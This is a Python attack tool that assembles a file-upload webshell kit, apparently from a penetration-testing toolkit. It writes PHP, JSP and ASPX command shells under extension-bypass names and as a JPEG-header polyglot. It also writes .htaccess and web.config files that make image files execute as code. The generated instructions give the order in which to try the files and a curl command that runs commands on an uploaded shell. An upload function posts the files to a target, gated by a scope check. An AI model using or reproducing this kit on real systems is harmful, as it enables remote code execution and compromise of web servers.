#!/usr/bin/env python3
"""大爱仙尊上传载荷包：写出可上传的马变体 + 配置文件，可选 POST 到授权站。

依赖 payload_forge 的 php-tiny / jsp / aspx。再补双扩展、大小写、JPEG 头、.htaccess、web.config。

示例:
  python3 炼蛊房/upload_forge_probe.py kit --case <案>
  python3 炼蛊房/upload_forge_probe.py post --url https://授权/upload --file <路径> --case <案>
  python3 炼蛊房/upload_forge_probe.py --self-test
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from payload_forge import php_tiny, aspx_cmd, jsp_cmd, _key  # noqa: E402
from sig_cleanup_scan import scan_bytes  # noqa: E402

JPEG_HDR = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"

HTACCESS = "AddType application/x-httpd-php .jpg .jpeg .png\n"

WEB_CONFIG = """<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="se_jpg" path="*.jpg" verb="GET,POST"
           modules="IsapiModule"
           scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
"""


def build_kit(dest: Path, key: str) -> dict[str, Any]:
    dest.mkdir(parents=True, exist_ok=True)
    php = php_tiny(key)
    files: dict[str, bytes] = {
        "se_tiny.php": php.encode(),
        "se_tiny.php.jpg": php.encode(),
        "se_tiny.phtml": php.encode(),
        "se_tiny.php5": php.encode(),
        "se_tiny.PhP": php.encode(),
        "se_tiny.jpg.php": php.encode(),
        "se_poly.jpg": JPEG_HDR + b"\n" + php.encode(),
        "se_gate.jsp": jsp_cmd(key).encode(),
        "se_gate.aspx": aspx_cmd(key).encode(),
        ".htaccess": HTACCESS.encode(),
        "web.config": WEB_CONFIG.encode(),
    }
    items = []
    for name, data in files.items():
        path = dest / name
        path.write_bytes(data)
        scan = scan_bytes(data, name=name if not name.startswith(".") else "htaccess.txt")
        items.append(
            {
                "name": name,
                "bytes": len(data),
                "scan": scan["verdict"],
                "path": str(path),
            }
        )
    how = (
        f"# 上传包\n\n- 口令头 `X-SE: {key}`\n"
        "- 先试 `se_tiny.php`；拦扩展试 `se_tiny.php.jpg` / `se_tiny.PhP` / `se_tiny.phtml`\n"
        "- 图床二次渲染：`se_poly.jpg`（JPEG 头 + PHP）\n"
        "- Apache 黑名单：先传 `.htaccess` 再传 `se_tiny.php.jpg`\n"
        "- IIS：`web.config` 只传到上传目录，不要盖站点根\n"
        "- 命中后 `curl -sk -H 'X-SE: KEY' -d c=id https://站/uploads/se_tiny.php`\n"
    )
    (dest / "HOW_TO.md").write_text(how, encoding="utf-8")
    rec = {
        "ok": True,
        "key": key,
        "dir": str(dest),
        "items": items,
        "playbook": "传承/寄生蛊.md",
    }
    (dest / "manifest.json").write_text(json.dumps(rec, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return rec


def post_file(url: str, path: Path, *, field: str, filename: str) -> dict[str, Any]:
    from scope_lib import require_in_scope
    import requests

    require_in_scope(url)
    data = path.read_bytes()
    name = filename or path.name
    r = requests.post(
        url,
        files={field: (name, data, "application/octet-stream")},
        timeout=20,
        verify=False,
    )
    return {"status": r.status_code, "len": len(r.content), "preview": (r.text or "")[:240], "url": url}


def run_self_test() -> list[str]:
    import tempfile

    fails: list[str] = []
    with tempfile.TemporaryDirectory() as td:
        rec = build_kit(Path(td), "seUpKey1")
        names = {i["name"] for i in rec["items"]}
        for need in ("se_tiny.php", "se_tiny.php.jpg", "se_poly.jpg", ".htaccess", "web.config"):
            if need not in names:
                fails.append(f"missing {need}")
        poly = Path(td) / "se_poly.jpg"
        if poly.read_bytes()[:3] != b"\xff\xd8\xff":
            fails.append("poly not jpeg")
        if b"shell_exec" not in poly.read_bytes():
            fails.append("poly no php")
    return fails


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊上传载荷包")
    sub = ap.add_subparsers(dest="cmd")
    ap.add_argument("--self-test", action="store_true")

    p_kit = sub.add_parser("kit")
    p_kit.add_argument("--case", default="")
    p_kit.add_argument("--out", default="")
    p_kit.add_argument("--key", default="")

    p_post = sub.add_parser("post")
    p_post.add_argument("--url", required=True)
    p_post.add_argument("--file", required=True)
    p_post.add_argument("--field", default="file")
    p_post.add_argument("--filename", default="")
    p_post.add_argument("--case", default="")

    args = ap.parse_args()
    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        print("self-test ok  upload kit")
        return 0

    if args.cmd == "kit":
        from scope_lib import ENGINE

        dest = Path(args.out).expanduser() if args.out else None
        if dest is None:
            if not args.case:
                raise SystemExit("[err] 需要 --case 或 --out")
            dest = ENGINE / "案卷" / args.case / "测绘" / "upload"
        rec = build_kit(dest, _key(args.key))
        print(json.dumps({"dir": rec["dir"], "key": rec["key"], "n": len(rec["items"])}, ensure_ascii=False))
        return 0

    if args.cmd == "post":
        rec = post_file(args.url, Path(args.file), field=args.field, filename=args.filename)
        print(json.dumps(rec, ensure_ascii=False))
        return 0 if rec["status"] < 500 else 1

    ap.error("需要 kit / post / --self-test")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
